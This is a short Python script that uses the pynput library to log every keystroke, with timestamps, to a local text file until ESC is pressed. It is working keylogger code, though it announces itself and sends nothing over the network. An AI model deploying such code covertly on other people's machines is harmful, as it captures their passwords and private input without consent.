from pynput import keyboard
from datetime import datetime

LOG_FILE = "keylog.txt"

def write_to_file(key):
    try:
        key_str = f"{key.char}"
    except AttributeError:
        key_str = f"[{key.name}]"
    
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(LOG_FILE, "a") as f:
        f.write(f"{timestamp} - {key_str}\n")

def on_press(key):
    write_to_file(key)

def on_release(key):
    if key == keyboard.Key.esc:
        print("Logging stopped by user (ESC pressed).")
        return False

if __name__ == "__main__":
    print("Starting keylogger... (Press ESC to stop)")
    with keyboard.Listener(on_press=on_press, on_release=on_release) as listener:
        listener.join()